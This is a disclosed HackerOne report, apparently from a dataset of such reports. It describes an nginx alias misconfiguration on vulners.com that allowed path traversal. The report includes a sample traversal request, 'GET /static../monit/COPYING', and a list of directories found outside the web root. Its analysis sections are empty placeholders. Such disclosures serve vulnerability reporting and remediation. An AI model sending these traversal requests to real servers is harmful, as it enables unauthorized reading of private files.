---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '317201'
original_report_id: '317201'
title: '[vulners.com] nginx alias_traversal'
weakness: Information Disclosure
team_handle: vulnerscom
created_at: '2018-02-17T19:34:56.469Z'
disclosed_at: '2018-05-03T12:08:29.209Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 14
tags:
- hackerone
- information-disclosure
---

# [vulners.com] nginx alias_traversal

## Metadata

- HackerOne Report ID: 317201
- Weakness: Information Disclosure
- Program: vulnerscom
- Disclosed At: 2018-05-03T12:08:29.209Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.
https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md

Уязвимость только в конфигурации http, на https такого нет.

Пример:
```http
GET /static../monit/COPYING HTTP/1.1
Host: vulners.com
```

{F264475}

Примеры директорий, которые я обнаружил
```
rh/
nginx/cache/
monit/bin/monit
monit/conf/
monit/man/
monit/COPYING
monit/CHANGES
```

## Impact

Incorrect configuration of alias could allow an attacker to read file stored outside the target folder.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
